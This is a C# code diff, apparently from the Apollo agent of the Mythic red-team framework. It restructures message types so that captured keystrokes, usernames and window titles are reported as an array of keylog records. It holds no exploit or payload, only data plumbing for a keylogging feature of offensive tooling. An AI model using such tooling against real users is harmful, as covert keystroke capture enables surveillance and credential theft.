@@ -108,6 +108,21 @@ namespace ApolloInterop.Structs
             public string KillDate;
         }
 
+        [DataContract]
+        public struct KeylogInformation : IMythicMessage
+        {
+            [DataMember(Name = "user")]
+            public string Username;
+            [DataMember(Name = "window_title")]
+            public string WindowTitle;
+            [DataMember(Name = "keystrokes")]
+            public string Keystrokes;
+            public MessageType GetTypeCode()
+            {
+                return MessageType.KeylogInformation;
+            }
+        }
+
         public class CredentialType
         {
             private CredentialType(string value) { Value = value; }
@@ -584,16 +599,12 @@ namespace ApolloInterop.Structs
             public object UserOutput;
             [DataMember(Name = "completed")]
             public bool? Completed;
-            [DataMember(Name = "user")]
-            public string User;
-            [DataMember(Name = "window_title")]
-            public string WindowTitle;
-            [DataMember(Name = "keystrokes")]
-            public string Keystrokes;
             [DataMember(Name = "task_id")]
             public string TaskID;
             [DataMember(Name = "status")]
             public string Status;
+            [DataMember(Name = "keylogs")]
+            public KeylogInformation[] Keylogs;
             [DataMember(Name = "edges")]
             public EdgeNode[] Edges;
             [DataMember(Name = "file_browser")]
@@ -649,10 +660,7 @@ namespace ApolloInterop.Structs
                 return this.FileBrowser.Equals(msg.FileBrowser) &&
                     this.UserOutput.Equals(msg.UserOutput) &&
                     this.Completed == msg.Completed &&
-                    this.User == msg.User &&
-                    this.WindowTitle == msg.WindowTitle &&
                     this.TaskID == msg.TaskID &&
-                    this.Keystrokes == msg.Keystrokes &&
                     this.Status == msg.Status &&
                     this.Upload.Equals(msg.Upload) &&
                     this.MessageID == msg.MessageID;
